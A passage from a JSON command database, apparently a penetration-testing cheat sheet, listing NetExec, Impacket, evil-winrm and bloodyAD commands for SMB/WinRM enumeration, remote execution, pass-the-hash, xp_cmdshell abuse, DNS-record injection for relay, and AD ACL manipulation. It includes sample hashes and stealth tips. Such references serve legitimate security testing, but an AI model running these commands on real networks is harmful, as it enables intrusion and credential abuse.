      "tags": [
        "nxc",
        "smb",
        "uac",
        "enumeration",
        "local-admin"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M uac"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' -u '<user>' --use-kcache -M uac"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.0/24' -u 'user' -p 'password' -M uac"
      ]
    },
    {
      "id": "nxc-spider-plus",
      "name": "NetExec spider_plus Module",
      "command": "nxc smb <target> -u '<user>' -p '<password>' -M spider_plus",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Recursively spider every readable share, indexing filenames, sizes, modification dates, and (optionally) content snippets matching keywords. Output as JSON for grep-friendly post-processing — the modern replacement for `--spider`.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "netexec",
        "nxc",
        "spider_plus",
        "smb",
        "file-search"
      ],
      "variations": [
        {
          "label": "With Pattern",
          "requires": "password",
          "command": "nxc smb <target> -u '<user>' -p '<password>' -M spider_plus -o PATTERN='password,secret,confidential'"
        },
        {
          "label": "Read File Contents",
          "requires": "password",
          "command": "nxc smb <target> -u '<user>' -p '<password>' -M spider_plus -o READ_ONLY=false DOWNLOAD_FLAG=true"
        }
      ],
      "references": [
        {
          "title": "NetExec spider_plus",
          "url": "https://www.netexec.wiki/smb-protocol/enumeration/spider_plus"
        }
      ],
      "examples": [
        "nxc smb 10.10.10.0/24 -u jdoe -p 'Password123!' -M spider_plus"
      ]
    },
    {
      "id": "nxc-zerologon",
      "name": "NetExec Zerologon Check (CVE-2020-1472)",
      "command": "nxc smb <dc-ip> -u '' -p '' -M zerologon",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Non-destructive check for the Netlogon CVE-2020-1472 (Zerologon) vulnerability against a domain controller. Does not actually reset the machine account — use the standalone exploit if you intend to.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "netexec",
        "nxc",
        "zerologon",
        "cve-2020-1472",
        "vulnerability-check"
      ],
      "references": [
        {
          "title": "Zerologon advisory",
          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472"
        }
      ],
      "examples": [
        "nxc smb 10.10.10.10 -u '' -p '' -M zerologon"
      ]
    },
    {
      "id": "rpcclient-enumdomusers",
      "name": "RPCClient Enum Domain Users",
      "command": "rpcclient -U '<domain>/<user>%<password>' <ip> -c 'enumdomusers'",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Enumerate domain users via RPC using rpcclient",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "rpcclient",
        "rpc",
        "enumeration",
        "users",
        "domain"
      ],
      "variations": [
        {
          "label": "Null Session",
          "requires": "no-creds",
          "command": "rpcclient -U '' -N <ip> -c 'enumdomusers'"
        }
      ],
      "examples": [
        "rpcclient -U 'corp.local/user%password' 192.168.1.100 -c 'enumdomusers'",
        "rpcclient -U '' -N 192.168.1.100 -c 'enumdomusers'"
      ]
    },
    {
      "id": "smbclient-interactive",
      "name": "SMBClient Interactive",
      "command": "smbclient '//<ip>/<share>' -U '<domain>/<user>%<password>'",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "Interactive SMB client for browsing and downloading files from shares",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "smbclient",
        "smb",
        "shares",
        "file-access",
        "interactive"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "smbclient '//<ip>/<share>' -U '<domain>/<user>' --pw-nt-hash '<hash>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "smbclient '//<ip>/<share>' -k --no-pass"
        },
        {
          "label": "Anonymous",
          "requires": "no-creds",
          "command": "smbclient '//<ip>/<share>' -N"
        }
      ],
      "examples": [
        "smbclient '//192.168.1.100/C$' -U 'corp.local/user%password'",
        "smbclient '//192.168.1.100/SYSVOL' -N"
      ]
    },
    {
      "id": "smbmap",
      "name": "SMBMap Share Enumeration",
      "command": "smbmap -u '<user>' -p '<password>' -H <ip> -r",
      "category": "enumeration",
      "subcategory": "smb",
      "description": "SMB share enumeration and access testing",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "smbmap",
        "smb",
        "shares",
        "enumeration"
      ],
      "variations": [
        {
          "label": "Null Session",
          "requires": "no-creds",
          "command": "smbmap -u '' -p '' -H <ip> -r"
        }
      ],
      "examples": [
        "smbmap -u guest -p '' -H 192.168.1.100 -r"
      ]
    },
    {
      "id": "nxc-ssh-exec",
      "name": "NetExec SSH Command Exec",
      "command": "nxc ssh <target> -u '<user>' -p '<password>' -x '<command>'",
      "category": "enumeration",
      "subcategory": "ssh",
      "description": "Spray a command across many SSH targets. Faster than scripting ssh in a loop and inherits all of nxc's threading + output formatting.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ssh"
      ],
      "tags": [
        "netexec",
        "nxc",
        "ssh",
        "exec"
      ],
      "variations": [
        {
          "label": "Key-Based Auth",
          "requires": "no-creds",
          "command": "nxc ssh <target> -u '<user>' --key-file <private-key> -x '<command>'"
        },
        {
          "label": "Custom Port",
          "requires": "password",
          "command": "nxc ssh <target> -u '<user>' -p '<password>' --port 2222 -x '<command>'"
        }
      ],
      "examples": [
        "nxc ssh 10.10.10.0/24 -u root -p 'Password123!' -x id"
      ]
    },
    {
      "id": "nxc-ssh-key",
      "name": "NetExec SSH Key Auth",
      "command": "nxc ssh <target> -u '<user>' --key-file <private-key>",
      "category": "enumeration",
      "subcategory": "ssh",
      "description": "Validate a recovered SSH private key against one or many hosts. Automatically detects passphrase-protected keys and reports per-host success.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "ssh"
      ],
      "tags": [
        "netexec",
        "nxc",
        "ssh",
        "key-auth"
      ],
      "variations": [
        {
          "label": "Encrypted Key",
          "requires": "password",
          "command": "nxc ssh <target> -u '<user>' --key-file <private-key> -p '<passphrase>'"
        }
      ],
      "examples": [
        "nxc ssh 10.10.10.0/24 -u root --key-file ~/.ssh/id_rsa"
      ]
    },
    {
      "id": "nxc-winrm-users",
      "name": "NetExec WinRM User Enum",
      "command": "nxc winrm <target> -u '<user>' -p '<password>' --users",
      "category": "enumeration",
      "subcategory": "winrm",
      "description": "Enumerate domain users via WinRM after a successful auth. Equivalent to the SMB --users flag but uses WS-Management transport, which is sometimes the only protocol left exposed on hardened hosts.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "winrm"
      ],
      "tags": [
        "netexec",
        "nxc",
        "winrm",
        "enumeration"
      ],
      "variations": [
        {
          "label": "Groups",
          "requires": "password",
          "command": "nxc winrm <target> -u '<user>' -p '<password>' --groups"
        },
        {
          "label": "Logged On Users",
          "requires": "password",
          "command": "nxc winrm <target> -u '<user>' -p '<password>' --loggedon-users"
        }
      ],
      "examples": [
        "nxc winrm 10.10.10.10 -u jdoe -p 'Password123!' --users"
      ]
    },
    {
      "id": "nxc-wmi-query",
      "name": "NetExec WMI Query",
      "command": "nxc wmi <target> -u '<user>' -p '<password>' --query '<wql-query>'",
      "category": "enumeration",
      "subcategory": "winrm",
      "description": "Run an arbitrary WQL query over WMI without dropping into wmic / Get-WmiObject. Useful for live process listing, service enumeration, and registry reads against hosts where WinRM is disabled but WMI/DCOM is exposed.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "wmi"
      ],
      "tags": [
        "netexec",
        "nxc",
        "wmi",
        "wql",
        "query"
      ],
      "variations": [
        {
          "label": "List Processes",
          "requires": "password",
          "command": "nxc wmi <target> -u '<user>' -p '<password>' --query 'SELECT Name,ProcessId FROM Win32_Process'"
        },
        {
          "label": "Hash Auth",
          "requires": "hash",
          "command": "nxc wmi <target> -u '<user>' -H <nt-hash> --query '<wql-query>'"
        }
      ],
      "examples": [
        "nxc wmi 10.10.10.10 -u jdoe -p 'Password123!' --query 'SELECT * FROM Win32_Process'"
      ]
    },
    {
      "id": "mssqlclient",
      "name": "Impacket MSSQLClient",
      "command": "impacket-mssqlclient '<domain>/<user>:<password>'@<ip>",
      "category": "lateral-movement",
      "subcategory": "mssql",
      "description": "Interactive MSSQL shell for command execution and database access",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "mssql"
      ],
      "tags": [
        "impacket",
        "mssql",
        "database",
        "shell",
        "sql"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-mssqlclient -hashes ':<hash>' '<domain>/<user>'@<ip>"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-mssqlclient -k -no-pass '<domain>/<user>'@<ip>"
        },
        {
          "label": "Windows Auth",
          "requires": "password",
          "command": "impacket-mssqlclient '<domain>/<user>:<password>'@<ip> -windows-auth"
        }
      ],
      "examples": [
        "impacket-mssqlclient 'corp.local/sa:password'@192.168.1.100",
        "impacket-mssqlclient 'corp.local/user:password'@192.168.1.100 -windows-auth"
      ]
    },
    {
      "id": "mssqlpwner",
      "name": "MSSQLPwner Linked Server Abuse",
      "command": "mssqlpwner '<domain>/<user>:<password>'@<ip> -windows-auth enumerate",
      "category": "lateral-movement",
      "subcategory": "mssql",
      "description": "Enumerate and abuse MSSQL linked servers for lateral movement",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "mssql"
      ],
      "tags": [
        "mssqlpwner",
        "mssql",
        "linked-server",
        "lateral-movement",
        "enumeration"
      ],
      "variations": [
        {
          "label": "Execute Command",
          "requires": "password",
          "command": "mssqlpwner '<domain>/<user>:<password>'@<ip> -windows-auth exec -command 'whoami'"
        }
      ],
      "examples": [
        "mssqlpwner 'corp.local/user:password'@192.168.1.56 -windows-auth enumerate",
        "mssqlpwner 'corp.local/user:password'@192.168.1.56 -windows-auth exec -command 'whoami'"
      ]
    },
    {
      "id": "nxc-mssql-exec",
      "name": "NetExec MSSQL Command Exec",
      "command": "nxc mssql <target> -u '<user>' -p '<password>' -x '<command>'",
      "category": "lateral-movement",
      "subcategory": "mssql",
      "description": "Execute OS commands through MSSQL — auto-enables xp_cmdshell if disabled and the account has sufficient privileges. The fastest path from sysadmin SQL login to RCE.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "mssql"
      ],
      "tags": [
        "netexec",
        "nxc",
        "mssql",
        "rce",
        "xp-cmdshell"
      ],
      "variations": [
        {
          "label": "Local SQL Auth",
          "requires": "password",
          "command": "nxc mssql <target> -u 'sa' -p '<password>' --local-auth -x '<command>'"
        },
        {
          "label": "PowerShell",
          "requires": "password",
          "command": "nxc mssql <target> -u '<user>' -p '<password>' -X '<powershell>'"
        }
      ],
      "examples": [
        "nxc mssql 10.10.10.10 -u sa -p 'Password123!' --local-auth -x whoami"
      ]
    },
    {
      "id": "nxc-mssql-enable-cmdshell",
      "name": "NetExec MSSQL Enable CmdShell",
      "command": "nxc mssql '<ip>' -u '<user>' -p '<password>' -M enable_cmdshell",
      "category": "lateral-movement",
      "subcategory": "mssql",
      "description": "Enable xp_cmdshell on a MSSQL server for OS command execution",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "mssql"
      ],
      "tags": [
        "nxc",
        "mssql",
        "cmdshell",
        "xp-cmdshell",
        "rce",
        "lateral-movement"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc mssql '<ip>' -u '<user>' -H '<hash>' -M enable_cmdshell"
        }
      ],
      "examples": [
        "nxc mssql '192.168.1.100' -u 'sa' -p 'password' -M enable_cmdshell"
      ]
    },
    {
      "id": "nxc-mssql-enum-links",
      "name": "NetExec MSSQL Linked Servers",
      "command": "nxc mssql '<ip>' -u '<user>' -p '<password>' -M enum_links",
      "category": "lateral-movement",
      "subcategory": "mssql",
      "description": "Enumerate MSSQL linked servers for lateral movement opportunities",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "mssql"
      ],
      "tags": [
        "nxc",
        "mssql",
        "linked-server",
        "enumeration",
        "lateral-movement"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc mssql '<ip>' -u '<user>' -H '<hash>' -M enum_links"
        }
      ],
      "examples": [
        "nxc mssql '192.168.1.56' -u 'user' -p 'password' -M enum_links"
      ]
    },
    {
      "id": "nxc-mssql-priv",
      "name": "NetExec MSSQL Privilege Check",
      "command": "nxc mssql '<ip>' -u '<user>' -p '<password>' -M mssql_priv",
      "category": "lateral-movement",
      "subcategory": "mssql",
      "description": "Enumerate and escalate MSSQL server privileges (sysadmin, impersonation, linked servers)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "mssql"
      ],
      "tags": [
        "nxc",
        "mssql",
        "privilege-escalation",
        "sysadmin",
        "impersonation"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc mssql '<ip>' -u '<user>' -H '<hash>' -M mssql_priv"
        }
      ],
      "examples": [
        "nxc mssql '192.168.1.100' -u 'user' -p 'password' -M mssql_priv"
      ]
    },
    {
      "id": "nxc-mssql-xpcmdshell",
      "name": "NetExec MSSQL xp_cmdshell",
      "command": "nxc mssql '<ip>' -u '<user>' -p '<password>' -x 'whoami' -M xp_cmdshell",
      "category": "lateral-movement",
      "subcategory": "mssql",
      "description": "Execute OS commands via MSSQL xp_cmdshell using NetExec",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "mssql"
      ],
      "tags": [
        "nxc",
        "mssql",
        "xp_cmdshell",
        "execution",
        "rce"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc mssql '<ip>' -u '<user>' -H '<hash>' -x 'whoami' -M xp_cmdshell"
        }
      ],
      "examples": [
        "nxc mssql '192.168.1.100' -u 'sa' -p 'password' -x 'whoami' -M xp_cmdshell"
      ]
    },
    {
      "id": "gettgt-kerberoast-hash",
      "name": "Impacket Over-Pass-The-Hash",
      "command": "impacket-getTGT -hashes ':<hash>' <domain>/<user> -dc-ip <ip>",
      "category": "lateral-movement",
      "subcategory": "pass-the-hash",
      "description": "Get TGT ticket using the hash",
      "platform": "linux",
      "requires": [
        "hash"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "opth",
        "tgt",
        "hash",
        "kerberos"
      ],
      "examples": [
        "impacket-getTGT -hashes ':e656e07c56d831611b577b160b259ad2' voleur.htb/administrator -dc-ip 10.10.11.76"
      ]
    },
    {
      "id": "xfreerdp",
      "name": "xFreeRDP Connection",
      "command": "xfreerdp3 /v:<ip> /u:<user> /p:'<password>' /dynamic-resolution /cert:ignore",
      "category": "lateral-movement",
      "subcategory": "rdp-ssh",
      "description": "RDP connection using xFreeRDP",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "rdp"
      ],
      "tags": [
        "xfreerdp",
        "rdp",
        "remote-desktop",
        "gui"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "xfreerdp3 /v:<ip> /u:<user> /pth:'<hash>' /dynamic-resolution /cert:ignore"
        }
      ],
      "examples": [
        "xfreerdp3 /v:192.168.1.100 /u:administrator /p:'password123' /dynamic-resolution /cert:ignore"
      ]
    },
    {
      "id": "evil-winrm",
      "name": "Evil-WinRM Shell",
      "command": "evil-winrm -i '<ip>' -u '<user>' -p '<password>'",
      "category": "lateral-movement",
      "subcategory": "remote-shells",
      "description": "Windows Remote Management shell connection",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "winrm"
      ],
      "tags": [
        "evil-winrm",
        "winrm",
        "shell",
        "remote"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "evil-winrm -i '<ip>' -u '<user>' -H '<hash>'"
        },
        {
          "label": "Kerberos (Realm)",
          "requires": "ticket",
          "command": "evil-winrm -i '<ip>' -r '<domain>'"
        }
      ],
      "references": [
        {
          "title": "Evil-WinRM GitHub",
          "url": "https://github.com/Hackplayers/evil-winrm"
        },
        {
          "title": "HackTricks - WinRM",
          "url": "https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm"
        }
      ],
      "examples": [
        "evil-winrm -i '192.168.1.100' -u 'administrator' -p 'password123'",
        "evil-winrm -i '192.168.1.100' -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42'"
      ]
    },
    {
      "id": "atexec",
      "name": "Impacket AtExec",
      "command": "impacket-atexec '<domain>/<user>:<password>@<ip>' 'whoami'",
      "category": "lateral-movement",
      "subcategory": "remote-shells",
      "description": "Execute commands via Windows Task Scheduler service",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "impacket",
        "atexec",
        "task-scheduler",
        "shell",
        "execution"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-atexec -hashes ':<hash>' '<domain>/<user>@<ip>' 'whoami'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-atexec -k -no-pass '<domain>/<user>@<ip>' 'whoami'"
        }
      ],
      "examples": [
        "impacket-atexec 'CORP/administrator:password@192.168.1.100' 'whoami'",
        "impacket-atexec -hashes ':e19ccf75ee54e06b06a5907af13cef42' 'CORP/administrator@192.168.1.100' 'whoami'"
      ]
    },
    {
      "id": "impacket-atexec",
      "name": "Impacket atexec.py (Scheduled Task)",
      "command": "impacket-atexec '<domain>/<user>:<password>@<target>' '<command>'",
      "category": "lateral-movement",
      "subcategory": "remote-shells",
      "description": "One-shot command execution by creating, running, and deleting a scheduled task over MS-TSCH. Output is captured from \\\\127.0.0.1\\ADMIN$. Requires local admin.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "impacket",
        "atexec",
        "lateral-movement",
        "scheduled-task"
      ],
      "variations": [
        {
          "label": "Pass-the-Hash",
          "requires": "hash",
          "command": "impacket-atexec -hashes :<nt-hash> '<domain>/<user>@<target>' '<command>'"
        },
        {
          "label": "Kerberos",
          "requires": "ticket",
          "command": "impacket-atexec -k -no-pass '<domain>/<user>@<target>' '<command>'"
        }
      ],
      "references": [
        {
          "title": "Impacket atexec",
          "url": "https://github.com/fortra/impacket/blob/master/examples/atexec.py"
        }
      ],
      "examples": [
        "impacket-atexec corp.local/jdoe:'Password123!'@10.10.10.10 'whoami /all'"
      ]
    },
    {
      "id": "dcomexec",
      "name": "Impacket DCOMExec",
      "command": "impacket-dcomexec '<domain>/<user>:<password>@<ip>'",
      "category": "lateral-movement",
      "subcategory": "remote-shells",
      "description": "Execute commands via DCOM (Distributed Component Object Model)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "impacket",
        "dcomexec",
        "dcom",
        "shell",
        "execution"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-dcomexec -hashes ':<hash>' '<domain>/<user>@<ip>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-dcomexec -k -no-pass '<domain>/<user>@<ip>'"
        }
      ],
      "examples": [
        "impacket-dcomexec 'CORP/administrator:password@192.168.1.100'",
        "impacket-dcomexec -hashes ':e19ccf75ee54e06b06a5907af13cef42' 'CORP/administrator@192.168.1.100'"
      ]
    },
    {
      "id": "impacket-dcomexec",
      "name": "Impacket dcomexec.py",
      "command": "impacket-dcomexec '<domain>/<user>:<password>@<target>'",
      "category": "lateral-movement",
      "subcategory": "remote-shells",
      "description": "Execute commands over DCOM (MMC20.Application / ShellWindows / ShellBrowserWindow) without dropping a service. Quieter than psexec/smbexec, no service installation event ID 7045.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "rpc",
        "smb"
      ],
      "tags": [
        "impacket",
        "dcomexec",
        "lateral-movement",
        "dcom",
        "stealth"
      ],
      "variations": [
        {
          "label": "Pass-the-Hash",
          "requires": "hash",
          "command": "impacket-dcomexec -hashes :<nt-hash> '<domain>/<user>@<target>'"
        },
        {
          "label": "ShellWindows Object",
          "requires": "password",
          "command": "impacket-dcomexec -object ShellWindows '<domain>/<user>:<password>@<target>'"
        },
        {
          "label": "Kerberos",
          "requires": "ticket",
          "command": "impacket-dcomexec -k -no-pass '<domain>/<user>@<target>'"
        }
      ],
      "references": [
        {
          "title": "Impacket dcomexec",
          "url": "https://github.com/fortra/impacket/blob/master/examples/dcomexec.py"
        }
      ],
      "examples": [
        "impacket-dcomexec corp.local/jdoe:'Password123!'@10.10.10.10"
      ]
    },
    {
      "id": "psexec",
      "name": "Impacket PSExec",
      "command": "impacket-psexec '<domain>/<user>:<password>@<ip>'",
      "category": "lateral-movement",
      "subcategory": "remote-shells",
      "description": "Execute commands via PSExec service",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "impacket",
        "psexec",
        "shell",
        "execution"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-psexec -hashes ':<hash>' '<domain>/<user>@<ip>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-psexec -k -no-pass '<domain>/<user>@<ip>'"
        }
      ],
      "examples": [
        "impacket-psexec 'CORP/administrator:password@192.168.1.100'",
        "impacket-psexec -hashes ':e19ccf75ee54e06b06a5907af13cef42' 'CORP/administrator@192.168.1.100'"
      ]
    },
    {
      "id": "smbexec",
      "name": "Impacket SMBExec",
      "command": "impacket-smbexec '<domain>/<user>:<password>@<ip>'",
      "category": "lateral-movement",
      "subcategory": "remote-shells",
      "description": "Execute commands via SMB service creation",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "impacket",
        "smbexec",
        "smb",
        "shell",
        "execution"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-smbexec -hashes ':<hash>' '<domain>/<user>@<ip>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-smbexec -k -no-pass '<domain>/<user>@<ip>'"
        }
      ],
      "examples": [
        "impacket-smbexec 'CORP/administrator:password@192.168.1.100'",
        "impacket-smbexec -hashes ':e19ccf75ee54e06b06a5907af13cef42' 'CORP/administrator@192.168.1.100'"
      ]
    },
    {
      "id": "wmiexec",
      "name": "Impacket WMIExec",
      "command": "impacket-wmiexec '<domain>/<user>:<password>@<ip>'",
      "category": "lateral-movement",
      "subcategory": "remote-shells",
      "description": "Execute commands via WMI (Windows Management Instrumentation)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "impacket",
        "wmiexec",
        "wmi",
        "shell",
        "execution"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-wmiexec -hashes ':<hash>' '<domain>/<user>@<ip>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-wmiexec -k -no-pass '<domain>/<user>@<ip>'"
        }
      ],
      "examples": [
        "impacket-wmiexec 'CORP/administrator:password@192.168.1.100'",
        "impacket-wmiexec -hashes ':e19ccf75ee54e06b06a5907af13cef42' 'CORP/administrator@192.168.1.100'"
      ]
    },
    {
      "id": "nxc-smb-exec",
      "name": "NetExec SMB Command Exec",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -d '<domain>' -X 'whoami'",
      "category": "lateral-movement",
      "subcategory": "remote-shells",
      "description": "Execute commands on a remote Windows host via SMB using NetExec",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "execution",
        "shell",
        "rce"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -d '<domain>' -X 'whoami'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' --use-kcache -d '<domain>' -X 'whoami'"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'administrator' -H 'f29207796c9e6829aa1882b7cccfa36d' -d 'bastion.local' -X 'whoami'"
      ]
    },
    {
      "id": "nxc-winrm-exec",
      "name": "NetExec WinRM Command Execution",
      "command": "nxc winrm <ip> -u <user> -p <password> -x '<command>'",
      "category": "lateral-movement",
      "subcategory": "remote-shells",
      "description": "Execute a command on a Windows host over WinRM (PowerShell Remoting). Use -X for PowerShell scriptblocks.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "winrm"
      ],
      "tags": [
        "nxc",
        "netexec",
        "winrm",
        "execution",
        "lateral-movement"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc winrm <ip> -u <user> -H <hash> -x '<command>'"
        },
        {
          "label": "PowerShell Block",
          "requires": "password",
          "command": "nxc winrm <ip> -u <user> -p <password> -X '<powershell>'"
        },
        {
          "label": "Kerberos (ccache)",
          "requires": "ticket",
          "command": "KRB5CCNAME=<ccache> nxc winrm <ip> -u <user> -k --use-kcache -x '<command>'"
        }
      ],
      "references": [
        {
          "title": "NetExec — WinRM Protocol",
          "url": "https://www.netexec.wiki/winrm-protocol"
        }
      ],
      "examples": [
        "nxc winrm 10.10.10.10 -u administrator -p 'Password123!' -x 'whoami /all'",
        "nxc winrm 10.10.10.10 -u admin -H :e19ccf75ee54e06b06a5907af13cef42 -X 'Get-Process | Where-Object {$_.Name -like \"*lsass*\"}'"
      ]
    },
    {
      "id": "nxc-wmi-exec",
      "name": "NetExec WMI Command Execution",
      "command": "nxc wmi <ip> -u <user> -p <password> -x '<command>'",
      "category": "lateral-movement",
      "subcategory": "remote-shells",
      "description": "Execute a command on a Windows host over WMI. WMI exec is often allowed in environments where SMB / WinRM is locked down and is a useful stealthier alternative to PSExec.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "wmi"
      ],
      "tags": [
        "nxc",
        "netexec",
        "wmi",
        "execution",
        "lateral-movement"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc wmi <ip> -u <user> -H <hash> -x '<command>'"
        },
        {
          "label": "Kerberos (ccache)",
          "requires": "ticket",
          "command": "KRB5CCNAME=<ccache> nxc wmi <ip> -u <user> -k --use-kcache -x '<command>'"
        }
      ],
      "references": [
        {
          "title": "NetExec — WMI Protocol",
          "url": "https://www.netexec.wiki/wmi-protocol"
        }
      ],
      "examples": [
        "nxc wmi 10.10.10.10 -u administrator -p 'Password123!' -x 'whoami /priv'",
        "nxc wmi 10.10.10.10 -u admin -H :e19ccf75ee54e06b06a5907af13cef42 -x 'tasklist /v'"
      ]
    },
    {
      "id": "bloodyad-add-dnsrecord",
      "name": "bloodyAD add dnsRecord",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' add dnsRecord '<name>' '<attacker-ip>'",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Create a new AD-integrated DNS record. Authenticated users can create records by default — chains nicely with mitm6 / NTLM relay (e.g. add a wpad record pointing at your box).",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "dns"
      ],
      "tags": [
        "bloodyad",
        "dns",
        "mitm6",
        "ntlm-relay"
      ],
      "variations": [
        {
          "label": "Remove Record",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' remove dnsRecord '<name>'"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add dnsRecord wpad 10.10.14.5"
      ]
    },
    {
      "id": "bloodyad-genericall",
      "name": "bloodyAD Add GenericAll",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' add genericAll '<target>' '<attacker>'",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Grant attacker GenericAll over a target object via LDAP. Requires WriteDacl or Owner on the target. Pair with `remove genericAll` after exploitation to clean up.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "acl",
        "genericall",
        "writedacl",
        "post-exploitation"
      ],
      "variations": [
        {
          "label": "Remove",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' remove genericAll '<target>' '<attacker>'"
        }
      ],
      "references": [
        {
          "title": "bloodyAD",
          "url": "https://github.com/CravateRouge/bloodyAD"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add genericAll itadmin jdoe"
      ]
    },
    {
      "id": "bloodyad-add-groupmember",
      "name": "bloodyAD Add Group Member",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' add groupMember '<group>' '<member>'",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Add a user/computer to a group via LDAP. Common abuse path when GenericAll/WriteProperty over a privileged group is achieved through ACL chains.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "groups",
        "acl",
        "post-exploitation"
      ],
      "variations": [
        {
          "label": "Remove",
          "requires": "password",
